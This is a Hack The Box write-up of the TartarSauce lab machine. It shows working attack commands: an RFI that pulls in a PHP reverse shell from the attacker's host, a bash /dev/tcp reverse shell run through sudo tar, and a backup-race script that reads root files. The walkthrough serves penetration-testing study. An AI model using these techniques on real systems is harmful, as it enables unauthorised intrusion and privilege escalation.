---
title: "Hack The Box - Tartarsouce"
date: 2021-11-24T20:30:30-04:00
categories:
  - WriteUp
  - HackTheBox
  - Linux
tags:
  - OSCP Preparation
  - CTF
  - Tar
  - RFI
  - Wordpress
  - Nmap
  - Gobuster
---

# Introduction

---

TartarSauce is a medium box, it is rated only 3.6. There are only about 3000 system own, that's not much for an over 3 year old machine. That's all I have to say, let's start enumerating the box.

# Enumeration

---

## Nmap Scan

---

As always I start with a simple port scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ sudo nmap 10.10.10.88 -p- -sS   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 20:01 CEST
Nmap scan report for 10.10.10.88
Host is up (0.055s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

I like that, only one open port, so only one port to scan deeper:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ sudo nmap 10.10.10.88 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 20:03 CEST
Nmap scan report for 10.10.10.88
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), 
ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.18 (94%), Linux 3.1 (93%), 
Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), 
Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   83.79 ms 10.10.16.1
2   21.16 ms 10.10.10.88

Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

## Enumeration Of The Web Server

---

I start off this section with a gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ gobuster dir -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.88
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,log
[+] Timeout:                 10s
===============================================================
2021/08/24 20:06:28 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10766]
/robots.txt           (Status: 200) [Size: 208]  
/webservices          (Status: 301) [Size: 316] [--> http://10.10.10.88/webservices/]
```

The robots.txt file does not help me, as well as the webservices directory, so I will scan it:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ gobuster dir -u http://10.10.10.88/webservices -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-webservices.txt -x php,html,log,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.88/webservices
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,log,txt
[+] Timeout:                 10s
===============================================================
2021/08/24 20:32:18 Starting gobuster in directory enumeration mode
===============================================================
/wp                   (Status: 301) [Size: 319] [--> http://10.10.10.88/webservices/wp/]
```

On the /wp/ directory, there is a wordpress instance running. I looked around the page, I found a sample page where I can create entries in the guestbook. I tried to create an entry, but it seems that it did not worked:

![Untitled](/assets/images/2021-11-24-tartarsauce/Untitled.png)

So I used wpscan to scan the webpage:

```bash
We found 3 plugins:

[+] Name: akismet - v4.0.3
 |  Last updated: 2018-05-26T17:14:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.0.6

[+] Name: brute-force-login-protection - v1.5.3
 |  Latest version: 1.5.3 (up to date)
 |  Last updated: 2017-06-29T10:39:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] Name: gwolle-gb - v2.3.10
 |  Last updated: 2018-05-12T10:06:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
[!] The version is out of date, the latest version is 2.5.2

[+] Enumerating installed themes (only ones marked as popular) ...
```

I found 3 plugins. But none of them seem to be vulnerable. So I check the URLs shown:

Interesting URL: [http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt](http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt)

I found this in the file:

```
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

= 1.5.3 =
* 2015-10-01
* When email is disabled, save it anyway when user is logged in.
* Add nb_NO (thanks BjÃ¸rn Inge VÃ¥rvik).
* Update ru_RU.
```

So this is a troll, the actual version is 1.5.3, which is vulnerable:

```
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ searchsploit gwolle 1.5.3
---------------------------------------------------------------- ----------------------
 Exploit Title                                                   |  Path
---------------------------------------------------------------- ----------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion  | php/webapps/38861.txt
---------------------------------------------------------------- ----------------------
Shellcodes: No Results

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ searchsploit -m php/webapps/38861.txt

  Exploit: WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/38861
     Path: /usr/share/exploitdb/exploits/php/webapps/38861.txt
File Type: UTF-8 Unicode text, with very long lines, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/tartarsauce/38861.txt
```

I need to visit this location: `wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]` and place a file on my [localhost](http://localhost) named wp-load.php that gets included and executed on the web server. This can be abused to place a reverse shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ cp /tools/shells/php-reverse-shell.php wp-load.php
                                                                                                                                                                                                                                             
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ nano wp-load.php 
                                                                                                                                                                                                                                             
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ sudo python3 -m http.server 80               
[sudo] password for user: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start a netcat listener and use this command to call the reverse shell:

```bash
curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.17.28/
```

And I got a reverse shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ nc -lvnp 4444                                                 
listening on [any] 4444 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.88] 42880
Linux TartarSauce 4.15.0-041500-generic
 15:55:24 up  1:48,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@TartarSauce:/$ export TERM=xterm
export TERM=xterm
www-data@TartarSauce:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@TartarSauce:/$
```

I also upgraded the shell to a real shell that also works when using shortcuts.

# Privilege Escalation

---

## www-data → onuma

---

I have no access to the user directory, so I need to privesc to onuma. I check the sudo programs:

```bash
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

I can run tar as onuma without password, nothing easier than this (see [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)):

```bash
cd /dev/shm
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.17.28/5555 0>&1' > a.sh
tar -cvf a.tar a.sh
sudo -u onuma tar -xvf a.tar --to-command /bin/bash
```

This will spawn a reverse shell (I think it would also have worked with spawning a normal shell):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/tartarsauce]
└─$ nc -lvnp 5555    
listening on [any] 5555 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.88] 37022
onuma@TartarSauce:/dev/shm$ whoami
whoami
onuma
```

There is the shell as onuma.

### User Flag

---

I should now be able to read the user flag:

```bash
onuma@TartarSauce:/dev/shm$ cd /home/onuma
cd /home/onuma
onuma@TartarSauce:~$ ls
ls
shadow_bkp
user.txt
onuma@TartarSauce:~$ cat user.txt
cat user.txt
b2**************************82c7
```

## onuma → root

---

I run some enumeration scripts, I found this process:

```bash
2018/05/29 07:56:33 CMD: UID=0    PID=24065  | /bin/bash /usr/sbin/backuperer
```

With the following script, you should get the root flag (saving the file as  `.b.sh`):

```bash
#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt
```

Run the script and wait, it will take up to a minute:

```bash
onuma@TartarSauce:/dev/shm$ ./.b.sh
Waiting for archive filename to change...
File changed... copying here
tar: var/www/html/webservices/monstra-3.0.4/public/uploads/.empty: 
Cannot stat: Permission denied
tar: Exiting with failure status due to previous errors
rm: cannot remove '.797cf910500993dc9c7109100e7e78c3f7b98372': 
No such file or directory
rm: cannot remove 'var/www/html/webservices/monstra-3.0.4/public/uploads/.empty':
Permission denied
Waiting for new logs...
Only in /var/www/html/webservices/monstra-3.0.4: robots.txt
Only in /var/www/html/webservices/monstra-3.0.4: rss.php
Only in /var/www/html/webservices/monstra-3.0.4: sitemap.xml
Only in /var/www/html/webservices/monstra-3.0.4: storage
Only in /var/www/html/webservices/monstra-3.0.4: tmp
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Thu Jan 21 05:38:54 EST 2021
------------------------------------------------------------------------
/var/tmp/.379fe8e77f9f84a66b9a6df9a452d10499713829
Binary files /var/www/html/webservices/wp/.wp-config.php.swp and 
/var/tmp/check/var/www/html/webservices/wp/.wp-config.php.swp differ
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Tue Aug 24 16:28:46 EDT 2021
------------------------------------------------------------------------
/var/tmp/.797cf910500993dc9c7109100e7e78c3f7b98372
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> e7**************************09f9
```

The root flag is displayed at the bottom of the output. This should also work for other files and vice verca (e.g. to replace /etc/shadow).

# Conclusions

---

The troll in the wp version is not like an OSCP like machine, it is a real CTF, just like the root flag. I do not like the box just because of this reason. I think that beginners or hackers that likes doing CTFs will like this machine.